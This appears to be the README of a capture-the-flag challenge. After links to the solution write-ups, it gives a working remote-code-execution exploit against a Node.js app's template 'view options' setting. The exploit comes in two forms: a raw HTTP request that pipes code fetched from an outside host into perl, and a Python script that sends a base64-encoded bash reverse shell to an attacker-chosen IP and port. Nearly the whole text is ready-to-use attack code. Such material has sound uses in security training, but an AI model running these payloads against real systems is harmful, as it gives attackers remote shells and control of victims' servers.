## Solution

English：[README.en.md](README.en.md)

中文：[README.zh-CN.md](README.zh-CN.md)

## Exploit

Raw HTTP ver:
```
POST / HTTP/1.1
Host: localhost:49007
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 133

settings[view options][outputFunctionName]=_;process.mainModule.constructor._load("child_process").exec("curl cyku.tw:8787 | perl");_
```

Python ver:
```python
import sys
import requests
import base64
import urllib.parse

if len(sys.argv) != 4:
    print()
    print('    Usage: python3 exploit.py <target url> <your ip> <your port>')
    print('         Example: python3 exploit.py http://localhost:49007 54.87.54.87 8787')
    print()
    exit()

target = sys.argv[1]    # http://localhost:49007
your_ip = sys.argv[2]   # 54.87.54.87
your_port = sys.argv[3] # 8787

command = base64.b64encode(f'/bin/bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1'.encode()).decode()
command = urllib.parse.quote(f'echo {command}|base64 -d|bash')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
res = requests.post(target, headers=headers, data=f'settings[view options][outputFunctionName]=_;process.mainModule.constructor._load("child_process").exec("{command}");_', verify=False)
```